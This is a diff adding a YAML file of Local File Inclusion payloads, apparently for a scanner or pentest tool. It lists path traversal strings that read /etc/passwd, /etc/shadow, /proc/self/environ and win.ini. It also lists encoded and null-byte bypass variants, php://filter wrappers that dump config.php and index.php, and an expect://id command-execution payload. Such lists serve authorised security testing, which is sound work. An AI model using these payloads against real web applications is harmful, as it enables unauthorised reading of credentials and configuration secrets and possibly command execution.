@@ -1,0 +1,29 @@
+# Local File Inclusion (LFI) Payloads
+# Edit this file to add or remove payloads without touching source code.
+
+payloads:
+  basic:
+    - "../../../../../../etc/passwd"
+    - "../../../../../../etc/shadow"
+    - "../../../../../../etc/hosts"
+    - "../../../../../../etc/issue"
+    - "../../../../../../etc/group"
+    - "....//....//....//....//etc/passwd"
+    - "..\\..\\..\\..\\..\\..\\windows\\win.ini"
+    - "../../../../../../proc/self/environ"
+    - "../../../../../../proc/self/cmdline"
+    - "../../../../../../etc/phpinfo.php"
+
+  encoded:
+    - "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+    - "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd"
+    - "..%252f..%252f..%252f..%252f..%252fetc/passwd"
+    - "../../../../../../etc/passwd%00"
+    - "../../../../../../etc/passwd%2500"
+
+  wrappers:
+    - "php://filter/convert.base64-encode/resource=../../../../../../etc/passwd"
+    - "php://filter/read=convert.base64-encode/resource=index.php"
+    - "php://filter/convert.base64-encode/resource=config.php"
+    - "file:///etc/passwd"
+    - "expect://id"
